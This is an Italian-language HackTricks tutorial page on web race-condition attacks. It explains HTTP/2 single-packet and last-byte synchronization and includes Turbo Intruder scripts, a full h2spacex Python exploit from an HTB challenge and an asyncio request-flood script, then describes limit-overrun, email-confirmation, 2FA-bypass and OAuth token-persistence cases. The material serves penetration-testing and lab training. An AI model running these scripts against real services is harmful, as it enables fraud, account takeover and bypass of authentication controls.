# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Per ottenere una comprensione approfondita di questa tecnica consulta il report originale in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Migliorare gli attacchi di Race Condition

Il principale ostacolo nello sfruttare race conditions è assicurarsi che più richieste siano elaborate nello stesso momento, con **una differenza di tempo di elaborazione molto bassa—idealmente inferiore a 1ms**.

Di seguito alcune tecniche per sincronizzare le richieste:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Supporta l'invio di due richieste su una singola connessione TCP, riducendo l'impatto del jitter di rete. Tuttavia, a causa delle variazioni lato server, due richieste potrebbero non essere sufficienti per un exploit di race condition consistente.
- **HTTP/1.1 'Last-Byte Sync'**: Permette di inviare in anticipo la maggior parte delle parti di 20-30 richieste, trattenendo un piccolo frammento che viene poi inviato insieme, ottenendo l'arrivo simultaneo al server.

La preparazione per Last-Byte Sync comporta:

1. Inviare headers e body data meno l'ultimo byte senza terminare lo stream.
2. Mettere in pausa per 100ms dopo l'invio iniziale.
3. Disabilitare TCP_NODELAY per utilizzare l'algoritmo di Nagle per raggruppare i frame finali.
4. Inviare ping per scaldare la connessione.

L'invio successivo dei frame trattenuti dovrebbe portare al loro arrivo in un unico pacchetto, verificabile con Wireshark. Questo metodo non si applica ai file statici, che normalmente non sono coinvolti negli attacchi RC.

### Adattarsi all'architettura del server

Comprendere l'architettura del target è cruciale. I front-end server potrebbero instradare le richieste in modo diverso, influenzando i tempi. Il pre-warming delle connessioni lato server, tramite richieste di poco conto, potrebbe normalizzare i tempi delle richieste.

#### Gestire il locking basato sulla sessione

Framework come il session handler di PHP serializzano le richieste per sessione, potenzialmente nascondendo vulnerabilità. Usare token di sessione diversi per ogni richiesta può aggirare questo problema.

#### Superare limiti di rate o di risorse

Se il connection warming non è efficace, indurre intenzionalmente i delay dei limiti di rate o risorse del web server tramite un flood di richieste fittizie potrebbe facilitare il single-packet attack inducendo un ritardo lato server favorevole alle race conditions.

## Esempi di attacco

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Se vuoi **inviare valori diversi**, puoi modificare il codice con questo che usa una wordlist dagli appunti:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Se il web non supporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` invece di `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Se devi inviare una richiesta a 1 endpoint e poi più richieste ad altri endpoint per attivare la RCE, puoi modificare lo script `race-single-packet-attack.py` con qualcosa del genere:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- È anche disponibile in **Repeater** tramite la nuova opzione '**Send group in parallel**' in Burp Suite.
- Per **limit-overrun** potresti semplicemente aggiungere la **stessa request 50 volte** nel gruppo.
- Per **connection warming**, potresti **aggiungere** all'**inizio** del **gruppo** alcune **requests** a qualche parte non statica del web server.
- Per il **delaying** del processo **tra** l'elaborazione **di una request e l'altra** in una procedura a 2 sottostati, potresti **aggiungere request extra tra** entrambe le request.
- Per una RC **multi-endpoint** potresti iniziare inviando la **request** che **porta allo stato nascosto** e poi **50 requests** subito dopo che **sfruttano lo stato nascosto**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Lo scopo di questo script è modificare l'email di un utente verificandola continuamente finché il token di verifica della nuova email non arriva all'ultima email (questo perché nel codice si osservava una RC in cui era possibile modificare un'email ma far inviare la verifica alla vecchia poiché la variabile che indicava l'email era già popolata con la prima).\
Quando la parola "objetivo" viene trovata nelle email ricevute, sappiamo di aver ricevuto il token di verifica dell'email modificata e terminiamo l'attacco.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Miglioramento di Single Packet Attack

Nella ricerca originale è spiegato che questo attacco ha un limite di 1.500 byte. Tuttavia, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) è stato spiegato come sia possibile estendere il limite di 1.500 byte del single packet attack fino alla **limitazione della finestra TCP di 65.535 B usando IP layer fragmentation** (splitting a single packet into multiple IP packets) e inviando i frammenti in ordine diverso, impedendo il reassemblaggio del pacchetto fino a quando tutti i frammenti non raggiungono il server. Questa tecnica ha permesso al ricercatore di inviare 10.000 request in circa 166ms.

Nota che, sebbene questo miglioramento renda l'attacco più affidabile in RC che richiede centinaia/migliaia di pacchetti che arrivino contemporaneamente, potrebbe anche avere alcune limitazioni software. Alcuni popolari HTTP server come Apache, Nginx e Go hanno un valore rigido di `SETTINGS_MAX_CONCURRENT_STREAMS` impostato rispettivamente a 100, 128 e 250. Tuttavia, altri come NodeJS e nghttp2 lo hanno illimitato.\
Questo significa sostanzialmente che Apache considererà solo 100 connessioni HTTP da una singola TCP connection (limitando questo RC attack).

Puoi trovare alcuni esempi che utilizzano questa tecnica nel repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Prima della ricerca precedente, questi erano alcuni payload usati che cercavano semplicemente di inviare i pacchetti il più velocemente possibile per provocare una RC.

- **Repeater:** Consulta gli esempi della sezione precedente.
- **Intruder**: Invia la **request** a **Intruder**, imposta il **number of threads** a **30** nel **Options menu**, seleziona come payload **Null payloads** e genera **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Questo è il tipo più basilare di race condition dove le **vulnerabilità** **appaiono** in punti che **limitano il numero di volte in cui puoi eseguire un'azione**. Per esempio usare lo stesso codice sconto più volte in un negozio web. Un esempio molto semplice si trova in [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o in [**this bug**](https://hackerone.com/reports/759247)**.**

Ci sono molte varianti di questo tipo di attacco, tra cui:

- Riscattare una gift card più volte
- Valutare un prodotto più volte
- Prelevare o trasferire denaro oltre il saldo del tuo account
- Riutilizzare la stessa soluzione CAPTCHA
- Bypassare un anti-brute-force rate limit

### **Sottostati nascosti**

Sfruttare race condition complesse spesso implica approfittare di brevi opportunità per interagire con sottostati della macchina nascosti o **non intenzionali**. Ecco come affrontarlo:

1. **Identificare potenziali sottostati nascosti**
- Inizia individuando endpoint che modificano o interagiscono con dati critici, come profili utente o processi di password reset. Concentrati su:
- **Storage**: Preferisci endpoint che manipolano dati persistenti lato server rispetto a quelli che gestiscono dati lato client.
- **Action**: Cerca operazioni che alterano dati esistenti, più propense a creare condizioni sfruttabili rispetto a quelle che aggiungono nuovi dati.
- **Keying**: Attacchi riusciti di solito coinvolgono operazioni indicizzate dallo stesso identificatore, e.g., username o reset token.
2. **Condurre un probing iniziale**
- Testa gli endpoint individuati con attacchi di race condition, osservando eventuali deviazioni dai risultati attesi. Risposte inaspettate o cambiamenti nel comportamento dell'applicazione possono indicare una vulnerabilità.
3. **Dimostrare la vulnerabilità**
- Riduci l'attacco al numero minimo di richieste necessario per sfruttare la vulnerabilità, spesso solo due. Questo passaggio può richiedere tentativi multipli o automazione a causa della tempistica precisa richiesta.

### Time Sensitive Attacks

La precisione nel sincronizzare le richieste può rivelare vulnerabilità, specialmente quando metodi prevedibili come i timestamp vengono usati per generare token di sicurezza. Per esempio, generare password reset tokens basati sui timestamp potrebbe permettere token identici per richieste simultanee.

**To Exploit:**

- Usa tempistiche precise, come un single packet attack, per effettuare richieste di password reset concorrenti. Token identici indicano una vulnerabilità.

**Example:**

- Richiedi due password reset token contemporaneamente e confrontali. Token che combaciano suggeriscono un difetto nella generazione dei token.

**Dai un'occhiata a** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **per provarlo.**

## Casi di studio sui sottostati nascosti

### Paga & aggiungi un articolo

Dai un'occhiata a [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) per vedere come **pagare** in un negozio e **aggiungere un articolo extra** che **non dovrai pagare**.

### Confermare altre email

L'idea è **verificare un indirizzo email e cambiarlo contemporaneamente con un altro** per capire se la piattaforma verifica il nuovo indirizzo.

### Cambiare l'email in 2 indirizzi (basato su cookie)

Secondo [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab era vulnerabile a takeover in questo modo perché poteva **inviare** l'**email verification token di un'email all'altra email**.

**Dai un'occhiata a** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **per provarlo.**

### Stati nascosti del Database / Bypass della conferma

Se vengono usate **2 scritture diverse** per **aggiungere** **informazione** all'interno di un **database**, esiste un breve intervallo di tempo in cui **solo i primi dati sono stati scritti** nel database. Per esempio, quando si crea un utente lo **username** e la **password** potrebbero essere **scritti** e **solo dopo viene scritto il token** per confermare l'account appena creato. Questo significa che per un breve periodo il **token per confermare un account è null**.

Therefore **registrare un account e inviare diverse richieste con un token vuoto** (`token=` or `token[]=` or any other variation) to confirm the account right away could allow to c**onfermare un account** where you don't control the email.

**Dai un'occhiata a** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **per provarlo.**

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistenza eterna

Esistono diversi [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Questi servizi ti permettono di creare un'applicazione e autenticare gli utenti registrati presso il provider.  
Per farlo, il **client** dovrà **permettere alla tua applicazione** di accedere ad alcuni dei loro dati all'interno del **OAUth provider**.\
Quindi, fin qui è solo un normale login con google/linkedin/github... dove ti viene mostrata una pagina che dice: "_L'applicazione \<InsertCoolName> vuole accedere alle tue informazioni, vuoi consentirlo?_" 

#### Race Condition in `authorization_code`

Il **problema** si manifesta quando lo **accetti** e viene inviato automaticamente un **`authorization_code`** all'applicazione dannosa. Quindi, questa **application sfrutta una Race Condition nel provider OAUth per generare più di una coppia di AT/RT** (_Authentication Token/Refresh Token_) a partire dal **`authorization_code`** per il tuo account. Fondamentalmente, sfrutterà il fatto che hai accettato che l'applicazione acceda ai tuoi dati per **creare più account**. Quindi, se **smetti di consentire all'applicazione l'accesso ai tuoi dati**, una coppia di AT/RT verrà eliminata, ma le altre rimarranno comunque valide.

#### Race Condition in `Refresh Token`

Una volta che hai **ottenuto un RT valido** puoi provare a **sfruttarlo per generare diverse coppie AT/RT** e **anche se l'utente revoca i permessi** all'applicazione dannosa di accedere ai suoi dati, **diversi RT rimarranno comunque validi.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) puoi trovare un PoC in Java per inviare messaggi WebSocket in **parallelo** per sfruttare **Race Conditions anche in Web Sockets**.
- Con Burp’s WebSocket Turbo Intruder puoi usare il motore **THREADED** per creare più connessioni WS e inviare payload in parallelo. Parti dall'esempio ufficiale e regola `config()` (thread count) per la concorrenza; questo è spesso più affidabile rispetto al batching su una singola connessione quando si effettua una race sullo stato lato server attraverso gli handler WS. Vedi [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
